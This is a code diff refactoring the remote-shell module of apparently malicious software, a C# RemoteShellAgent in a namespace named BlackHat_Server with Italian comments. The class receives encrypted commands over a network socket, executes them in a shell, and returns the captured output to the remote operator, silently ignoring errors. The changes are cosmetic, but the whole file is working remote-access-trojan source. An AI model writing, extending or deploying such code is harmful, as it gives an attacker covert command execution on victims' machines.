@@ -1,24 +1,23 @@
-﻿using System;
-using System.Collections.Generic;
+﻿using System.Diagnostics;
 using System.Net.Sockets;
 using System.Text;
 using System.Threading;
 
 namespace BlackHat_Server
 {
-    class RemoteShellAgent
+    internal class RemoteShellAgent
     {
-        ShellWorker sw;
+        private readonly MsgManager mm;
 
-        NetworkStream myStream;
-        MsgManager mm;
+        private readonly NetworkStream myStream;
 
-        string sCmdEnd;
+        private string sCmdEnd;
 
-        StringBuilder sLastOutPut = new StringBuilder(); // ULTIMO OUTPUT
+        private StringBuilder sLastOutPut = new StringBuilder(); // ULTIMO OUTPUT
 
 
-        bool stopListener = false;
+        private bool stopListener;
+        private readonly ShellWorker sw;
 
         public RemoteShellAgent(NetworkStream clientStream)
         {
@@ -28,42 +27,41 @@ namespace BlackHat_Server
             sw = new ShellWorker();
 
             //EVENTI
-            sw.StdOut += RemShell_StdOut;  
+            sw.StdOut += RemShell_StdOut;
             sw.StdError += RemShell_StdError;
 
             sCmdEnd = sw.sCmdComplete; // COMANDO DI CONCLUSIONE
         }
 
         /// <summary>
-        /// Avvia thread di ascolto per Remote Shell
+        ///     Avvia thread di ascolto per Remote Shell
         /// </summary>
         public void StartShellListener()
         {
-            Thread t = new Thread(ShellListener);
-            t.IsBackground = true;            
+            var t = new Thread(ShellListener);
+            t.IsBackground = true;
             t.Start();
         }
 
 
         /// <summary>
-        /// Listener Shell
+        ///     Listener Shell
         /// </summary>
         private void ShellListener()
         {
             while (ST_Client.Instance.isConnected && !stopListener)
-            {
                 try
                 {
-                    System.Threading.Thread.Sleep(10);
+                    Thread.Sleep(10);
 
-                    string cmd = mm.WaitForEncryMessageRicorsive(10000);
+                    var cmd = mm.WaitForEncryMessageRicorsive(10000);
 
                     if (stopListener)
                         break;
 
                     if (cmd != "TIMEOUT" && cmd != "__ERROR__")
                     {
-                        string[] cmdSplit = cmd.Split('|');
+                        var cmdSplit = cmd.Split('|');
 
                         switch (cmdSplit[0])
                         {
@@ -75,20 +73,12 @@ namespace BlackHat_Server
                                 RunCmd("EXIT");
                                 stopListener = true;
                                 break;
-
-                            default:
-                                break;
                         }
-
-
-
                     }
                 }
-                catch 
-                {                    
+                catch
+                {
                 }
-
-            }
 
             // ARRIVO QUI PERCHè IL LISTENER è MORTO
 
@@ -102,16 +92,13 @@ namespace BlackHat_Server
             }
             catch
             {
-
             }
-                
         }
         //------------------------------------
 
 
-        
         /// <summary>
-        /// Esegue un comando
+        ///     Esegue un comando
         /// </summary>
         /// <param name="cmd"></param>
         private void RunCmd(string cmd)
@@ -119,52 +106,47 @@ namespace BlackHat_Server
             try
             {
                 sLastOutPut = new StringBuilder();
-                sw.Execute(cmd); 
+                sw.Execute(cmd);
             }
-            catch 
+            catch
             {
-                
             }
-
         }
 
         /// <summary>
-        /// Invio la risposta dell'ultima esecuzione
+        ///     Invio la risposta dell'ultima esecuzione
         /// </summary>
         private void SendAnswer()
         {
             try
-            {                
+            {
                 mm.SendLargeEncryMessage(sLastOutPut.ToString(), 10000);
             }
-            catch 
-            {                
-               
+            catch
+            {
             }
         }
 
         /// <summary>
-        /// Evento richiamato quando arriva una nuova linea di output
+        ///     Evento richiamato quando arriva una nuova linea di output
         /// </summary>
         /// <param name="sender"></param>
         /// <param name="e"></param>
-        private void RemShell_StdOut(object sender, System.Diagnostics.DataReceivedEventArgs e)
+        private void RemShell_StdOut(object sender, DataReceivedEventArgs e)
         {
-            string line = e.Data;
+            var line = e.Data;
 
             if (line != sw.sCmdComplete)
                 sLastOutPut.AppendLine(line);
-            else                        
+            else
                 SendAnswer();
         }
 
-        static void  RemShell_StdError(object sender, System.Diagnostics.DataReceivedEventArgs e)
+        private static void RemShell_StdError(object sender, DataReceivedEventArgs e)
         {
             //Console.ForegroundColor = ConsoleColor.Red;
             //Console.WriteLine(e.Data);
             //Console.ResetColor();
         }
-    
-
     }
 }
